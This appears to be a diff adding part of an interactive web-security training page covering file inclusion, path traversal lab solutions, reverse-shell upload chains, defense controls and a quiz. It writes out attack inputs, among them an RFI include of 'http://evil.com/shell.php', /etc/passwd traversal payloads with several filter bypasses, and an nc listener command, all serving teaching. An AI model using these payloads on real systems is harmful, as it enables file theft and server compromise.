+<div style="text-align:center;font-size:12px;margin:12px 0"><div style="font-size:30px;margin-bottom:6px">⚙️</div><strong style="color:var(--amber)">INCLUDE</strong> a file<br><span style="color:var(--dim)">Server processes the file</span></div>
+<div class="cb" style="font-size:10px">?page=../../../../var/log/access.log</div></div>
+<div class="cd dg2"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--red)">🌐 RFI</h3>
+<div style="text-align:center;font-size:12px;margin:12px 0"><div style="font-size:30px;margin-bottom:6px">💥</div><strong style="color:var(--red)">EXECUTE</strong> remote code<br><span style="color:var(--dim)">Full server compromise</span></div>
+<div class="cb" style="font-size:10px">?page=http://evil.com/shell.php</div></div></div>
+<div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--cyan)">Comparison Table</h3>
+<table class="ctbl"><thead><tr><th>Feature</th><th>Path Traversal</th><th>LFI</th><th>RFI</th></tr></thead><tbody>
+<tr><td>Main Goal</td><td>Access files</td><td>Include local files</td><td>Include remote files</td></tr>
+<tr><td>Uses ../</td><td style="color:var(--green)">✓ Yes</td><td style="color:var(--green)">✓ Often</td><td style="color:var(--amber)">⚠ Sometimes</td></tr>
+<tr><td>Code Execution</td><td style="color:var(--red)">✗ Usually No</td><td style="color:var(--amber)">⚠ Sometimes</td><td style="color:var(--green)">✓ Yes</td></tr>
+<tr><td>Risk Level</td><td style="color:var(--amber)">Medium–High</td><td style="color:var(--green)">High</td><td style="color:var(--red)">Critical</td></tr>
+<tr><td>Requires include()</td><td style="color:var(--red)">✗ No</td><td style="color:var(--green)">✓ Yes</td><td style="color:var(--green)">✓ Yes</td></tr></tbody></table></div>
+<div class="cd" style="margin-top:16px"><div style="text-align:center;padding:12px">
+<div style="font-family:var(--disp);font-size:15px;font-weight:800;color:var(--bright);margin-bottom:6px">Golden Rule</div>
+<div style="font-family:var(--mono);font-size:12px">App <strong style="color:var(--cyan)">reads</strong> → Path Traversal | App <strong style="color:var(--amber)">includes</strong> → LFI | App <strong style="color:var(--red)">fetches remote</strong> → RFI</div></div></div></section>
+
+<section class="sec" id="m2labs">
+<div class="snum">13</div>
+<div class="sh"><div class="stag">// MODULE 2 — PRACTICAL LABS</div><h2 class="stit">Path Traversal Lab Walkthroughs</h2><p class="sdesc">Every lab: Scenario → Request → Input → Validation → Resolved Path → Why Fails → Defense.</p></div>
+<div class="tabs">
+<button class="tb act" onclick="sPLT('p1')">Lab 1: Basic</button>
+<button class="tb" onclick="sPLT('p2')">Lab 2: Absolute Path</button>
+<button class="tb" onclick="sPLT('p3')">Lab 3: Double Encoding</button>
+<button class="tb" onclick="sPLT('p4')">Lab 4: Start of Path</button>
+<button class="tb" onclick="sPLT('p5')">Lab 5: Null Byte</button>
+</div>
+<div id="p1" class="tp2 act"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:10px;font-weight:700;color:var(--amber)">Lab 1: Basic Path Traversal</h3>
+<div class="hb2 hby" style="font-size:12px;margin-bottom:12px">No validation. Direct traversal.</div>
+<div class="cb" style="font-size:11px;margin-bottom:12px"><span class="cm">// Vulnerable code</span><br><span class="vr">$file</span> = <span class="fn">$_GET</span>[<span class="sr">'filename'</span>];<br><span class="fn">readfile</span>(<span class="sr">"/var/www/images/"</span> . <span class="vr">$file</span>);</div>
+<div class="hb2 hbg" style="font-size:12px"><strong>Solution:</strong> <code>filename=../../../etc/passwd</code><br>Images dir is 3 levels deep. Three ../ reaches root, then /etc/passwd.</div></div></div>
+<div id="p2" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:10px;font-weight:700;color:var(--amber)">Lab 2: Absolute Path Bypass</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:12px">../ blocked. Absolute paths not checked.</div>
+<div class="hb2 hbg" style="font-size:12px"><strong>Solution:</strong> <code>filename=/etc/passwd</code><br>Blacklist only filters ../. Absolute path bypasses entirely.</div></div></div>
+<div id="p3" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:10px;font-weight:700;color:var(--amber)">Lab 3: Double URL Encoding</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:12px">App decodes, strips ../. Double encoding hides traversal.</div>
+<div class="hb2 hbg" style="font-size:12px"><strong>Solution:</strong> <code>filename=..%252F..%252F..%252Fetc%252Fpasswd</code><br>%252F → decode → %2F → not / → passes check → FS resolves as /.</div></div></div>
+<div id="p4" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:10px;font-weight:700;color:var(--amber)">Lab 4: Start-of-Path Validation</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:12px">Checks path starts with /var/www/images/. Prefix + traversal escapes.</div>
+<div class="hb2 hbg" style="font-size:12px"><strong>Solution:</strong> <code>filename=/var/www/images/../../../etc/passwd</code><br>Passes prefix check, ../ escapes allowed directory.</div></div></div>
+<div id="p5" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:10px;font-weight:700;color:var(--amber)">Lab 5: Null Byte Bypass</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:12px">Validates .jpg extension. Null byte truncates at filesystem.</div>
+<div class="hb2 hbg" style="font-size:12px"><strong>Solution:</strong> <code>filename=../../../etc/passwd%00.jpg</code><br>App sees .jpg → passes. FS stops at %00 → opens /etc/passwd. Legacy PHP only.</div></div></div></section>
+<section class="sec" id="m3s1">
+<div class="snum">14</div>
+<div class="sh"><div class="stag">// MODULE 3 — REVERSE SHELL UPLOAD</div><h2 class="stit">The Complete Attack Chain</h2><p class="sdesc">Students must understand every stage — not just "upload shell → get terminal."</p></div>
+<div class="cd" style="margin-bottom:20px">
+<h3 style="font-family:var(--disp);font-size:14px;margin-bottom:14px;font-weight:700;color:var(--cyan)">Real-World Scenario: Employee Profile Picture Upload</h3>
+<div class="fd" style="margin-bottom:14px">
+<div class="fs"><div class="fi gn">👤</div><div class="fl">Employee</div></div><div class="fa"></div>
+<div class="fs"><div class="fi gn">📤</div><div class="fl">Uploads avatar.jpg</div></div><div class="fa"></div>
+<div class="fs"><div class="fi gn">🔍</div><div class="fl">App validates</div></div><div class="fa"></div>
+<div class="fs"><div class="fi gn">💾</div><div class="fl">Server stores</div></div><div class="fa"></div>
+<div class="fs"><div class="fi gn">🖼️</div><div class="fl">Browser displays</div></div>
+</div><div class="hb2 hbg" style="font-size:12px;text-align:center;font-family:var(--mono)">NORMAL flow — everything works as designed.</div></div>
+<div class="cd dg2" style="margin-bottom:20px"><div style="text-align:center;padding:16px">
+<div style="font-family:var(--disp);font-size:16px;font-weight:800;color:var(--bright);margin-bottom:8px">The Security Question</div>
+<div style="font-family:var(--mono);font-size:13px;color:var(--red)">"What if the application allows the user to upload something the web server can EXECUTE instead of simply DISPLAY?"</div></div></div>
+<div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:14px;font-weight:700;color:var(--red)">Complete Chain Visualization</h3>
+<div class="cvis" id="chain-vis">
+<div class="cvn" id="ch1"><div class="cnl">STAGE 1</div><div class="cnt2">Unsafe File Upload</div></div><div class="cva" id="ca1"></div>
+<div class="cvn" id="ch2"><div class="cnl">STAGE 2</div><div class="cnt2">File Storage</div></div><div class="cva" id="ca2"></div>
+<div class="cvn" id="ch3"><div class="cnl">STAGE 3</div><div class="cnt2">Web Accessibility</div></div><div class="cva" id="ca3"></div>
+<div class="cvn" id="ch4"><div class="cnl">STAGE 4</div><div class="cnt2">Server-Side Interpretation</div></div><div class="cva" id="ca4"></div>
+<div class="cvn" id="ch5"><div class="cnl">STAGE 5</div><div class="cnt2">Code Execution</div></div><div class="cva" id="ca5"></div>
+<div class="cvn" id="ch6"><div class="cnl">STAGE 6</div><div class="cnt2">Outbound Connection</div></div><div class="cva" id="ca6"></div>
+<div class="cvn" id="ch7"><div class="cnl">STAGE 7</div><div class="cnt2">Listener Accepts</div></div><div class="cva" id="ca7"></div>
+<div class="cvn" id="ch8" style="border-color:var(--green)"><div class="cnl">STAGE 8</div><div class="cnt2" style="color:var(--green)">Interactive Shell</div></div>
+</div>
+<div style="text-align:center;margin-top:12px"><button class="btn bc" onclick="animChain()">▶ Animate Full Chain</button> <button class="btn bg" onclick="resetChain()">Reset</button></div></div>
+<div class="cd" style="margin-top:20px"><div style="text-align:center;padding:16px">
+<div style="font-family:var(--disp);font-size:15px;font-weight:800;color:var(--bright);margin-bottom:6px">Critical Distinction</div>
+<div style="font-size:13px;color:var(--dim);line-height:1.8"><span style="color:var(--red)">The Reverse Shell is NOT the vulnerability.</span><br><span style="color:var(--cyan)">The vulnerability is what allowed code execution.</span><br>The reverse shell is one possible <strong>post-exploitation channel</strong> after execution has been achieved.</div></div></div></section>
+
+<section class="sec" id="m3s2">
+<div class="snum">15</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">Where Does the Code Actually Execute?</h2><p class="sdesc">Understanding which machine runs the code is fundamental to understanding the impact.</p></div>
+<div class="simc" style="margin-bottom:20px"><div class="simh">❓ Where does uploaded server-side code execute?</div><div class="simb">
+<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">
+<button class="btn bg" style="text-align:left;justify-content:flex-start" onclick="chkEA(this,'w')">Browser (user's machine)</button>
+<button class="btn bg" style="text-align:left;justify-content:flex-start" onclick="chkEA(this,'w')">Attacker machine</button>
+<button class="btn bg" style="text-align:left;justify-content:flex-start" onclick="chkEA(this,'c')">Web Server</button>
+<button class="btn bg" style="text-align:left;justify-content:flex-start" onclick="chkEA(this,'w')">Database</button></div>
+<div id="ea-res" style="display:none"></div></div></div>
+<div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--cyan)">Execution Context</h3>
+<div class="fd">
+<div class="fs"><div class="fi cy">🌐</div><div class="fl">Web Application</div></div><div class="fa"></div>
+<div class="fs"><div class="fi am">⚙️</div><div class="fl">Web Server Process</div></div><div class="fa"></div>
+<div class="fs"><div class="fi rd">👤</div><div class="fl">Restricted OS User</div></div><div class="fa"></div>
+<div class="fs"><div class="fi pu">💾</div><div class="fl">Filesystem / Network</div></div></div>
+<div class="hb2 hby" style="font-size:12px;margin-top:12px"><strong>Important:</strong> Code executes as the web server account (e.g., www-data). This is typically NOT root/administrator.</div></div></section>
+
+<section class="sec" id="m3s3">
+<div class="snum">16</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">What is a Shell?</h2><p class="sdesc">A shell is an interface through which commands can be sent to an operating system.</p></div>
+<div class="g2"><div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--cyan)">Shell = OS Command Interface</h3>
+<div class="fd" style="flex-direction:column;gap:6px;align-items:stretch">
+<div style="padding:8px 12px;background:var(--cd);border:1px solid rgba(139,92,246,0.1);border-radius:4px;font-family:var(--mono);font-size:11px;text-align:center">Human</div>
+<div style="text-align:center;color:var(--dim)">↓</div>
+<div style="padding:8px 12px;background:var(--ad);border:1px solid rgba(245,158,11,0.12);border-radius:4px;font-family:var(--mono);font-size:11px;text-align:center">Shell (bash / sh / PowerShell)</div>
+<div style="text-align:center;color:var(--dim)">↓</div>
+<div style="padding:8px 12px;background:var(--rd);border:1px solid rgba(239,68,68,0.12);border-radius:4px;font-family:var(--mono);font-size:11px;text-align:center">Operating System</div>
+<div style="text-align:center;color:var(--dim)">↓</div>
+<div style="padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:4px;font-family:var(--mono);font-size:11px;text-align:center">Filesystem / Processes / Network</div></div></div>
+<div><div class="cd" style="margin-bottom:12px"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--amber)">Linux Shells</h3>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim);line-height:2"><span style="color:var(--cyan)">sh</span> — Bourne shell<br><span style="color:var(--cyan)">bash</span> — Bourne Again shell<br><span style="color:var(--cyan)">zsh</span> — Z shell</div></div>
+<div class="cd"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--amber)">Windows Shells</h3>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim);line-height:2"><span style="color:var(--cyan)">cmd</span> — Command Prompt<br><span style="color:var(--cyan)">PowerShell</span> — Advanced shell</div></div></div></div></section>
+
+<section class="sec" id="m3s4">
+<div class="snum">17</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">What is a Listener?</h2><p class="sdesc">A listener is a process waiting for an incoming network connection.</p></div>
+<div class="simc"><div class="simh">📡 Listener Simulator <span class="tg wr" style="margin-left:8px">SAFE</span></div><div class="simb"><div class="g2">
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--dim);margin-bottom:8px">ATTACKER MACHINE</div>
+<div class="term"><div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><div class="tt">nc -lvnp 4444</div></div>
+<div class="tbody" id="lis-term" style="font-size:12px"><span class="tl"><span class="td2">🔴 No listener active</span></span><span class="tl"><span class="tcm">Click "Start Listener" to begin</span></span></div></div>
+<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
+<button class="btn bgn" id="btn-lis" onclick="togLis()">▶ Start Listener</button>
+<button class="btn bg" id="btn-conn" onclick="simConn()" disabled>⚡ Simulate Connect</button></div></div>
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--dim);margin-bottom:8px">CONCEPT</div>
+<div class="hb2 hbc" style="font-size:12px;line-height:1.8;margin-bottom:12px"><strong style="color:var(--cyan)">IP Address</strong> = Which machine?<br><strong style="color:var(--cyan)">Port</strong> = Which application/process?<br><strong style="color:var(--cyan)">Listener</strong> = Process waiting for connection</div>
+<div class="hb2 hby" style="font-size:12px">The target initiates an outbound connection to the attacker's listener. If running, connection accepted. If not, fails.</div></div></div></div></div></section>
+
+<section class="sec" id="m3s5">
+<div class="snum">18</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">Why "Reverse" Shell?</h2><p class="sdesc">The connection direction is reversed compared to a bind shell.</p></div>
+<div class="g2">
+<div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--amber)">BIND SHELL</h3>
+<div style="text-align:center;margin:16px 0"><div style="font-family:var(--mono);font-size:12px;color:var(--dim);margin-bottom:8px">Target opens/listens on a port</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--amber);margin-bottom:8px">ATTACKER → TARGET</div>
+<div style="font-size:28px;color:var(--amber)">→→→</div>
+<div style="font-family:var(--mono);font-size:11px;color:var(--dim);margin-top:8px">Attacker initiates connection TO target</div></div></div>
+<div class="cd dg2"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--red)">REVERSE SHELL</h3>
+<div style="text-align:center;margin:16px 0"><div style="font-family:var(--mono);font-size:12px;color:var(--dim);margin-bottom:8px">Attacker starts listener</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--red);margin-bottom:8px">TARGET → ATTACKER</div>
+<div style="font-size:28px;color:var(--red)">←←←</div>
+<div style="font-family:var(--mono);font-size:11px;color:var(--dim);margin-top:8px">Target initiates connection TO attacker</div></div></div></div>
+<div class="cd" style="margin-top:16px"><div style="text-align:center;padding:12px">
+<div style="font-family:var(--disp);font-size:16px;font-weight:800;color:var(--bright);margin-bottom:6px">What is Reversed?</div>
+<div style="font-family:var(--mono);font-size:13px;color:var(--red)">The connection direction.</div>
+<div style="font-size:12px;color:var(--dim);margin-top:6px">Instead of attacker connecting to target, the compromised target connects outward to the attacker's listener.</div></div></div></section>
+
+<section class="sec" id="m3s6">
+<div class="snum">19</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">Firewall / Egress Filtering Analogy</h2><p class="sdesc">The office-building analogy: inbound restrictions vs outbound permissions.</p></div>
+<div class="g2">
+<div class="cd dg2"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--red)">INBOUND — Often Restricted</h3>
+<div style="text-align:center;padding:16px"><div style="font-family:var(--mono);font-size:12px;color:var(--dim)">ATTACKER</div>
+<div style="font-size:24px;color:var(--red);margin:6px 0">↓ INBOUND</div>
+<div style="width:80px;height:40px;margin:0 auto;background:var(--rd);border:2px solid var(--red);border-radius:4px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--red)">🔥 FW</div>
+<div style="font-size:20px;color:var(--red);margin:6px 0">✕ BLOCKED</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim)">TARGET</div></div></div>
+<div class="cd suc"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--green)">OUTBOUND — Often Permitted</h3>
+<div style="text-align:center;padding:16px"><div style="font-family:var(--mono);font-size:12px;color:var(--dim)">TARGET</div>
+<div style="font-size:24px;color:var(--green);margin:6px 0">↓ OUTBOUND</div>
+<div style="width:80px;height:40px;margin:0 auto;background:var(--gd);border:2px solid var(--green);border-radius:4px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--green)">🔥 FW</div>
+<div style="font-size:20px;color:var(--green);margin:6px 0">✓ ALLOWED</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim)">→ ATTACKER LISTENER</div></div></div></div>
+<div class="cd wrn" style="margin-top:16px"><div style="padding:12px">
+<div style="font-family:var(--disp);font-size:13px;font-weight:700;color:var(--amber);margin-bottom:8px">⚠ Important Caveat</div>
+<div style="font-size:12px;color:var(--dim);line-height:1.7">Reverse shells do NOT always bypass firewalls. Success depends on: outbound firewall policy, network routing, proxy requirements, egress filtering, destination IP/port, listener availability.<br><br><strong style="color:var(--bright)">Core takeaway:</strong> "A reverse connection may be useful because the target initiates it, but outbound traffic can still be restricted."</div></div></div></section>
+<section class="sec" id="m3s7">
+<div class="snum">20</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">Full Upload → Shell Attack Simulator</h2><p class="sdesc">Step through the complete attack chain one stage at a time.</p></div>
+<div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:14px;font-weight:700;color:var(--cyan)">Interactive Attack Chain <span class="tg in" style="margin-left:8px">SAFE</span></h3>
+<div id="atk-steps">
+<div class="step-pills" id="atk-pills"></div>
+<div id="atk-content" style="min-height:120px"></div>
+<div style="margin-top:14px;display:flex;gap:8px"><button class="btn bc" id="atk-next" onclick="atkNext()">Next Step →</button><button class="btn bg" onclick="atkReset()">Reset</button></div>
+</div></div></section>
+
+<section class="sec" id="m3s8">
+<div class="snum">21</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">Break the Attack — Defense Controls</h2><p class="sdesc">Click each security control to see how it breaks the attack chain.</p></div>
+<div class="cd" style="margin-bottom:20px"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:14px;font-weight:700;color:var(--cyan)">Attack Chain</h3>
+<div style="display:flex;flex-wrap:wrap;gap:4px;align-items:center;font-family:var(--mono);font-size:11px">
+<span id="bk-up" style="padding:4px 8px;background:var(--cd);border:1px solid rgba(139,92,246,0.15);border-radius:4px;color:var(--accent)">UPLOAD</span> →
+<span id="bk-st" style="padding:4px 8px;background:var(--cd);border:1px solid rgba(139,92,246,0.15);border-radius:4px;color:var(--accent)">STORE</span> →
+<span id="bk-rch" style="padding:4px 8px;background:var(--cd);border:1px solid rgba(139,92,246,0.15);border-radius:4px;color:var(--accent)">REACH</span> →
+<span id="bk-ex" style="padding:4px 8px;background:var(--cd);border:1px solid rgba(139,92,246,0.15);border-radius:4px;color:var(--accent)">EXECUTE</span> →
+<span id="bk-cn" style="padding:4px 8px;background:var(--cd);border:1px solid rgba(139,92,246,0.15);border-radius:4px;color:var(--accent)">CONNECT</span> →
+<span id="bk-ln" style="padding:4px 8px;background:var(--cd);border:1px solid rgba(139,92,246,0.15);border-radius:4px;color:var(--accent)">LISTEN</span> →
+<span id="bk-sh" style="padding:4px 8px;background:var(--cd);border:1px solid rgba(139,92,246,0.15);border-radius:4px;color:var(--accent)">SHELL</span>
+</div></div>
+<div class="bkg" id="break-grid">
+<div class="bkc" onclick="applyBreak(this,1)"><div class="bci">🔒</div><div class="bct">Strong Upload Validation</div><div class="bcd">Allowlist extensions + content inspection + magic bytes</div><div class="bcs" style="color:var(--dim)">Click to apply</div></div>
+<div class="bkc" onclick="applyBreak(this,2)"><div class="bci">📁</div><div class="bct">Store Outside Webroot</div><div class="bcd">Files stored outside executable directory</div><div class="bcs" style="color:var(--dim)">Click to apply</div></div>
+<div class="bkc" onclick="applyBreak(this,3)"><div class="bci">🚫</div><div class="bct">Disable Script Execution</div><div class="bcd">.htaccess / server config blocks execution in upload dir</div><div class="bcs" style="color:var(--dim)">Click to apply</div></div>
+<div class="bkc" onclick="applyBreak(this,4)"><div class="bci">🎲</div><div class="bct">Randomize Filenames</div><div class="bcd">Generated names + controlled retrieval logic</div><div class="bcs" style="color:var(--dim)">Click to apply</div></div>
+<div class="bkc" onclick="applyBreak(this,5)"><div class="bci">🔥</div><div class="bct">Egress Filtering</div><div class="bcd">Outbound firewall blocks unauthorized connections</div><div class="bcs" style="color:var(--dim)">Click to apply</div></div>
+<div class="bkc" onclick="applyBreak(this,6)"><div class="bci">👤</div><div class="bct">Least-Privilege Account</div><div class="bcd">Web service runs with minimal OS permissions</div><div class="bcs" style="color:var(--dim)">Click to apply</div></div>
+</div>
+<div class="cd" style="margin-top:16px"><div id="break-result" style="font-family:var(--mono);font-size:12px;color:var(--dim)">Click a defense control above to see its effect on the attack chain.</div></div></section>
+
+<section class="sec" id="m3s9">
+<div class="snum">22</div>
+<div class="sh"><div class="stag">// MODULE 3</div><h2 class="stit">Troubleshooting Challenge</h2><p class="sdesc">Given scenarios — determine where the attack chain failed.</p></div>
+<div style="display:flex;flex-direction:column;gap:14px">
+<div class="cd wrn"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:10px;font-weight:700;color:var(--amber)">Scenario 1</h3>
+<div style="font-size:13px;color:var(--bright);margin-bottom:8px">File uploaded successfully. Opening URL downloads the file instead of executing it.</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim)"><strong style="color:var(--cyan)">Where did the chain fail?</strong> Server-side execution / runtime handling. The server is returning the file as static data, not interpreting it as code.</div></div>
+<div class="cd wrn"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:10px;font-weight:700;color:var(--amber)">Scenario 2</h3>
+<div style="font-size:13px;color:var(--bright);margin-bottom:8px">File executes but listener receives nothing.</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim)"><strong style="color:var(--cyan)">Investigate:</strong> Callback IP, callback port, listener status, routing, outbound firewall, egress filtering.</div></div>
+<div class="cd wrn"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:10px;font-weight:700;color:var(--amber)">Scenario 3</h3>
+<div style="font-size:13px;color:var(--bright);margin-bottom:8px">Server returns 404.</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim)"><strong style="color:var(--cyan)">Possible issue:</strong> Incorrect storage/retrieval path. File may not be at the expected URL.</div></div>
+<div class="cd wrn"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:10px;font-weight:700;color:var(--amber)">Scenario 4</h3>
+<div style="font-size:13px;color:var(--bright);margin-bottom:8px">Server returns 403.</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim)"><strong style="color:var(--cyan)">Possible issue:</strong> Access control / web server policy blocking execution in that directory.</div></div>
+<div class="cd wrn"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:10px;font-weight:700;color:var(--amber)">Scenario 5</h3>
+<div style="font-size:13px;color:var(--bright);margin-bottom:8px">Connection reaches listener but shell is limited.</div>
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim)"><strong style="color:var(--cyan)">Explanation:</strong> Code execution inherits the privileges of the web-server process. Do not assume root/admin access.</div></div>
+</div></section>
+
+<section class="sec" id="connect">
+<div class="snum">23</div>
+<div class="sh"><div class="stag">// FINAL</div><h2 class="stit">Connect the Three Vulnerabilities</h2><p class="sdesc">These topics are related but distinct. Understanding their differences is critical.</p></div>
+<div class="g3" style="margin-bottom:20px">
+<div class="cd"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--cyan)">FILE UPLOAD</h3>
+<div class="hb2 hbc" style="font-size:12px;text-align:center;font-family:var(--mono)">"What file can I make the application accept?"</div></div>
+<div class="cd wrn"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--amber)">PATH TRAVERSAL</h3>
+<div class="hb2 hby" style="font-size:12px;text-align:center;font-family:var(--mono)">"What filesystem location can I access?"</div></div>
+<div class="cd dg2"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--red)">REVERSE SHELL UPLOAD</h3>
+<div class="hb2 hbr" style="font-size:12px;text-align:center;font-family:var(--mono)">"Can unsafe upload → execution → network connection?"</div></div></div>
+<div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--cyan)">UNTRUSTED INPUT — Three Attack Surfaces</h3>
+<div class="fd" style="flex-direction:column;gap:8px;align-items:stretch">
+<div style="padding:10px 14px;background:var(--cd);border:1px solid rgba(139,92,246,0.1);border-radius:6px;font-family:var(--mono);font-size:12px"><strong style="color:var(--cyan)">File Upload</strong> → User controls file content, name, type → File Handling pipeline</div>
+<div style="padding:10px 14px;background:var(--ad);border:1px solid rgba(245,158,11,0.12);border-radius:6px;font-family:var(--mono);font-size:12px"><strong style="color:var(--amber)">Path Traversal</strong> → User controls file path → Path Resolution</div>
+<div style="padding:10px 14px;background:var(--rd);border:1px solid rgba(239,68,68,0.12);border-radius:6px;font-family:var(--mono);font-size:12px"><strong style="color:var(--red)">Reverse Shell Upload</strong> → Upload + Execution + Outbound Connection → Interactive Shell</div></div></div></section>
+<section class="sec" id="quiz">
+<div class="snum">24</div>
+<div class="sh"><div class="stag">// FINAL</div><h2 class="stit">Knowledge Check</h2><p class="sdesc">Reasoning-based questions — not memorization.</p></div>
+<div class="sb2"><div class="sn" id="q-score">0</div><div><div class="slb">POINTS</div><div style="font-size:11px;color:var(--dim)" id="q-count">0 / 10 answered</div></div>
+<div class="spr"><div class="spf" id="q-pf" style="width:0%"></div></div></div>
+<div id="quiz-container">
+<div class="qq" data-q="0"><div class="qqt">1. Why is checking only the file extension insufficient?</div>
+<div class="qqo"><div class="qop" onclick="answer(0,this,'w')">Extensions are always accurate</div><div class="qop" onclick="answer(0,this,'c')">Extensions are user-controlled and can be spoofed</div><div class="qop" onclick="answer(0,this,'w')">Extensions are checked by the OS</div></div><div class="qfb" id="fb0"></div></div>
+<div class="qq" data-q="1"><div class="qqt">2. Why should MIME type not automatically be trusted?</div>
+<div class="qqo"><div class="qop" onclick="answer(1,this,'w')">MIME types are set by the browser</div><div class="qop" onclick="answer(1,this,'w')">MIME types are encrypted</div><div class="qop" onclick="answer(1,this,'c')">Content-Type header is sent by the client and can be modified</div></div><div class="qfb" id="fb1"></div></div>
+<div class="qq" data-q="2"><div class="qqt">3. Why is client-side validation not a security boundary?</div>
+<div class="qqo"><div class="qop" onclick="answer(2,this,'c')">The user controls the browser and can disable/bypass it</div><div class="qop" onclick="answer(2,this,'w')">It runs too slowly</div><div class="qop" onclick="answer(2,this,'w')">It only works on Chrome</div></div><div class="qfb" id="fb2"></div></div>
+<div class="qq" data-q="3"><div class="qqt">4. Why does upload not automatically mean execution?</div>
+<div class="qqo"><div class="qop" onclick="answer(3,this,'w')">Uploads are always blocked</div><div class="qop" onclick="answer(3,this,'c')">The server must interpret the file as executable code via its runtime</div><div class="qop" onclick="answer(3,this,'w')">Execution only happens on Windows</div></div><div class="qfb" id="fb3"></div></div>
+<div class="qq" data-q="4"><div class="qqt">5. What does ../ mean in path traversal?</div>
+<div class="qqo"><div class="qop" onclick="answer(4,this,'w')">Navigate to current directory</div><div class="qop" onclick="answer(4,this,'c')">Navigate to parent directory (one level up)</div><div class="qop" onclick="answer(4,this,'w')">Delete the current directory</div></div><div class="qfb" id="fb4"></div></div>
+<div class="qq" data-q="5"><div class="qqt">6. What is a listener?</div>
+<div class="qqo"><div class="qop" onclick="answer(5,this,'w')">A type of firewall</div><div class="qop" onclick="answer(5,this,'c')">A process waiting for an incoming network connection</div><div class="qop" onclick="answer(5,this,'w')">A file upload tool</div></div><div class="qfb" id="fb5"></div></div>
+<div class="qq" data-q="6"><div class="qqt">7. Why is it called a reverse shell?</div>
+<div class="qqo"><div class="qop" onclick="answer(6,this,'c')">The connection direction is reversed — target connects to attacker</div><div class="qop" onclick="answer(6,this,'w')">It uses reverse proxy</div><div class="qop" onclick="answer(6,this,'w')">It runs in reverse order</div></div><div class="qfb" id="fb6"></div></div>
+<div class="qq" data-q="7"><div class="qqt">8. Why can upload succeed while reverse shell still fails?</div>
+<div class="qqo"><div class="qop" onclick="answer(7,this,'w')">Upload always means shell</div><div class="qop" onclick="answer(7,this,'c')">Multiple conditions must succeed: execution, outbound connection, listener availability</div><div class="qop" onclick="answer(7,this,'w')">The shell is automatic</div></div><div class="qfb" id="fb7"></div></div>
+<div class="qq" data-q="8"><div class="qqt">9. Does a reverse shell automatically mean root access?</div>
+<div class="qqo"><div class="qop" onclick="answer(8,this,'w')">Yes, always root</div><div class="qop" onclick="answer(8,this,'c')">No — it inherits the web server process privileges (e.g., www-data)</div><div class="qop" onclick="answer(8,this,'w')">Only on Linux</div></div><div class="qfb" id="fb8"></div></div>
+<div class="qq" data-q="9"><div class="qqt">10. What is the difference between storage and execution?</div>
